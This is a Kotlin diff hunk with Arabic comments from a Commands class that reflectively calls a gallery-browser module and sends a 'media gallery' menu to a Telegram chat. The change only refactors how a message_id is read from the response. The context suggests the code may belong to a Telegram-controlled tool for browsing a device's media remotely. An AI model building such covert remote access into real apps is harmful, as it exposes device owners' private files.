@@ -750,10 +750,8 @@ class Commands private constructor(context: Context) {
                 val kb = invokeMethod(galleryBrowser, "getGridKb", "pending", 0)
                 val jsonKb = kb?.toString() ?: ""
                 val response = sendTelegramMessage(tg, cid, "🖼️ معرض الوسائط", jsonKb)
-                // حفظ message_id لمشاكل التنقل
-                val msgId = response?.let { (it as? Map<*, *>)?.get("result")?.let { result ->
-                    (result as? Map<*, *>)?.get("message_id")
-                } }
+                // ✅ استخراج message_id باستخدام safeGet بدلاً من الأقواس المربعة
+                val msgId = response?.safeGetMap("result")?.safeGet("message_id") as? Number
                 if (msgId != null) {
                     setModuleField(m, "last_mid", msgId)
                 }
